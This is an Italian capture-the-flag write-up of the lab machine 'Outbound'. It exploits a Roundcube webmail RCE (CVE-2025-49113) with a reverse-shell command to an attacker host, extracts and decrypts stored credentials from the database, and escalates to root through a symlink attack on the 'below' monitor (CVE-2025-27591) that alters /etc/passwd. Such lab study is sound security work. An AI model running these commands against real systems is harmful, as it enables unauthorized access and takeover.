+++
date = '2026-08-05T23:43:56+02:00'
draft = false
title = 'Outbound Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`11/07/2025`**

![Outbound.png](/images/imgs_outbound/Outbound.png)

---
# Introduzione

**_Outbound_** è una macchina **Linux** di livello **Easy** che simula uno scenario **assume breach**. 

L'accesso iniziale richiede lo sfruttamento delle credenziali fornite per accedere a un'istanza **Roundcube Webmail**, vulnerabile ad un difetto di **Authenticated Remote Code Execution** (**CVE-2025-49113**). Dopo aver ottenuto l'accesso come **`www-data`**, il lateral movement prevede l'enumerazione del **database MySQL** interno per estrarre una **password di sessione criptata**, e l'utilizzo degli script integrati di **Roundcube** per decifrarla ed effettuare un pivot sull'utente **`jacob`**.
Infine, la Privilege Escalation si concentra su un binario di monitoraggio di sistema mal configurato chiamato **below**. Sfruttando una vulnerabilità nota (**CVE-2025-27591**) legata alla gestione insicura dei log, sono riuscito a eseguire un **symlink attack** per sovrascrivere i permessi dell'**`/etc/passwd`** e passare facilmente a **root**.

---
# Tecniche Utilizzate

- **Roundcube Webmail RCE (CVE-2025-49113)**
- **Database Dump & Session Password Decryption**
- **Symlink Attack (CVE-2025-27591)**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- outbound
```

```text
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
4853/tcp  filtered unknown
5563/tcp  filtered unknown
5776/tcp  filtered unknown
9986/tcp  filtered kaostransport
11095/tcp filtered weave
... [snip] ...
```

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV outbound
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to [http://mail.outbound.htb/](http://mail.outbound.htb/)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ho aggiunto **`mail.outbound.htb`** al mio file **`/etc/hosts`**.

---
# Accesso Iniziale | Roundcube RCE (CVE-2025-49113)

Navigando sulla pagina web era hostato un login di **Roundcube Webmail**. Trattandosi di uno scenario di **assume breach**, ho effettuato il login utilizzando le credenziali fornite.

Controllando la sezione "**About**", ho notato subito che la versione era **`1.6.10`**.

![version.png](/images/imgs_outbound/version.png)

Cercando online, ho scoperto che questa versione è vulnerabile alla **CVE-2025-49113**.

- **(ricerca dettagliata di [fearsoff.org](https://fearsoff.org/research/roundcube))**.

**Nota**: _La **CVE-2025-49113** è una vulnerabilità di **Post-Authentication Remote Code Execution** in **Roundcube**. Deriva da un'impropria sanificazione dei dati forniti dall'utente nella gestione delle email o nella configurazione delle impostazioni, permettendo a un attaccante autenticato di iniettare ed eseguire **comandi PHP/di sistema arbitrari** sul server web sottostante._

Ho trovato un **PoC** scritto dallo stesso autore dell'articolo.

- **https://github.com/fearsoff-org/CVE-2025-49113**

Ho lanciato l'exploit e ho ottenuto immediatamente l'**accesso iniziale** come utente **`www-data`**:

```bash
php CVE-2025-49113.php [http://mail.outbound.htb](http://mail.outbound.htb) tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/22667 0>&1'"
```

![initial_access.png](/images/imgs_outbound/initial_access.png)

---
# Lateral Movement | Database Dump & Decryption

Una volta ottenuta una shell su un web server, il mio primo istinto è sempre quello di cercare informazioni sul **database**. Ho controllato il file di configurazione di **Roundcube**:

```bash
cat config.inc.php
```

![db_info.png](/images/imgs_outbound/db_info.png)

La password del database e la **`des_key`** per la crittografia erano scritte in chiaro al suo interno.

Ho provato a connettermi al **DB**, ma la shell continuava a bloccarsi. Per risolvere il problema, ho fatto l'upgrade ad una **TTY** completamente interattiva:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

- **Fonte: https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet**

Con una shell stabile, mi sono connesso al **database**:

```bash
mysql -u roundcube -p
```

![db.png](/images/imgs_outbound/db.png)

Ho iniziato a recuperare informazioni. La tabella **`users`** conteneva alcuni "hash", ma si sono rivelati essere solo un **rabbit hole**.

![db1.png](/images/imgs_outbound/db1.png)

Passando oltre, ho dumpato la tabella **`sessions`** e ho trovato un interessante blob in **base64**.

![db2.png](/images/imgs_outbound/db2.png)

Decodificandolo ho scoperto l'username **jacob** insieme a una **stringa password criptata**.

![db3.png](/images/imgs_outbound/db3.png)

Ho fatto qualche ricerca su come **Roundcube** criptasse le password di sessione e ho scoperto che utilizza il **`3DES`** con la **secret key** che era anch'essa salvata in **`config.inc.php`**.

![info2.png](/images/imgs_outbound/info2.png)

**Roundcube** fornisce nativamente un binario **`decrypt.sh`** per invertire esattamente questo tipo di crittografia.

**Nota**: _La prima volta che ho fatto questa macchina quando era attiva, mi era completamente sfuggito il dettaglio che **Roundcube** fornisse un suo script di decrittazione nativo. Ho sprecato una quantità di tempo imbarazzante a cercare online e alla fine ho usato uno script in **Python** generato da un'**IA**... Mannaggia a me._

![retard.png](/images/imgs_outbound/retard.png)

L'ho usato con la stringa criptata per rivelare la password di **Jacob**:

```bash
./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
su jacob
```

![decrypt.png](/images/imgs_outbound/decrypt.png)

---
# Privilege Escalation | below Symlink Attack (CVE-2025-27591)

All'interno della home di **Jacob**, ho trovato alcune email dall'utente **mel** che leakavano una password e un suggerimento riguardante privilegi speciali per ispezionare i log di sistema.

![mail.png](/images/imgs_outbound/mail.png)

![mail2.png](/images/imgs_outbound/mail2.png)

Ho provato ad eseguire **`sudo -l`**, ma ho ricevuto l'errore **`sudo: command not found`** a causa della mia attuale shell. Per ottenere una sessione pulita, mi sono connesso direttamente via **SSH** usando le credenziali di **Jacob**:

```bash
ssh jacob@outbound
sudo -l
```

Qui ho trovato anche la **user flag**.

![sudol.png](/images/imgs_outbound/sudol.png)

Ho controllato **GTFOBins** per **`/usr/bin/below`** ma non ho trovato nulla. Quindi, ho letteralmente cercato su Google "**below cve lpe**" e ho scoperto una recente vulnerabilità di **Local Privilege Escalation**: **[CVE-2025-27591](https://www.miggo.io/vulnerability-database/cve/CVE-2025-27591)**.

**Nota**: _La **CVE-2025-27591** è una vulnerabilità nel monitor di sistema **below**. Il difetto esiste perché il servizio scrive gli error log in una directory world-writable (**`/var/log/below`**) senza controllare adeguatamente la presenza di **symlink**. Quando l'applicazione viene forzata a registrare un errore mentre è in esecuzione come **root**, seguirà qualsiasi **symlink** posizionato in quella directory e cambierà forzatamente i permessi del file di destinazione in **`0666`** (**lettura/scrittura per tutti**)_

Per comprendere appieno il flusso dell'exploit, ho analizzato un **PoC** pubblico:

- **[BridgerAlderson/CVE-2025-27591-PoC](https://github.com/BridgerAlderson/CVE-2025-27591-PoC)**

che si divide in tre semplici passaggi:

1. **Creazione del Symlink**: Sostituire il file di log **`/var/log/below/error_root.log`** con un **symlink** che punta a **`/etc/passwd`**.

2. **Innesco dell'Errore**: Eseguire **`sudo /usr/bin/below record`** per forzare il servizio a scrivere un errore. Eseguito come **root**, segue il **symlink** e sovrascrive i permessi di **`/etc/passwd`** a **`0666`**.

3. **Iniezione della Backdoor**: Modificare il file **`/etc/passwd`** ormai scrivibile per scalare i privilegi (aggiungendo un nuovo utente **`UID 0`** o rimuovendo la password di **root**).

Ho comunque eseguito l'attacco manualmente. Per prima cosa, ho creato il **symlink**:

```bash
rm /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log
```

![privesc1.png](/images/imgs_outbound/privesc1.png)

Poi, ho innescato il binario tramite **sudo** (il che ha forzato l'errore e cambiato i permessi dell'**`/etc/passwd`**). 

![privesc2.png](/images/imgs_outbound/privesc2.png)

Infine, ho aperto il file con **nano** e ho semplicemente rimosso la **`x`** dalla riga dell'utente **root** (cambiando **`root:x:0:0`**... in **`root::0:0`**...), il che permette di loggarsi come **root** senza password.

```bash
su root
```

![rootf.png](/images/imgs_outbound/rootf.png)

Pwned.

---
# Considerazioni Finali

**_Outbound_** è la macchina **Easy** perfetta.

L'accesso iniziale è uno scenario **assume breach** molto realistico, e navigare nel database interno per estrarre le **sessioni criptate** è stato qualcosa di nuovo per me. La mia svista iniziale con lo script **`decrypt.sh`** è stata un bel promemoria: controllare sempre i tool già disponibili sul sistema prima di cercare di reinventare la ruota.

La fase di Privilege Escalation è stata geniale. Sfruttare un **Symlink Attack** è una tecnica elegante che evidenzia esattamente perché le directory **world-writable** siano così pericolose.

**Fonti**:

- **Roundcube RCE (CVE-2025-49113) | https://fearsoff.org/research/roundcube**

- **Roundcube PoC | https://github.com/fearsoff-org/CVE-2025-49113**

- **TTY Upgrade Cheat Sheet | https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet**

- **below Symlink LPE (CVE-2025-27591) | https://www.miggo.io/vulnerability-database/cve/CVE-2025-27591**

- **below PoC | https://github.com/BridgerAlderson/CVE-2025-27591-PoC**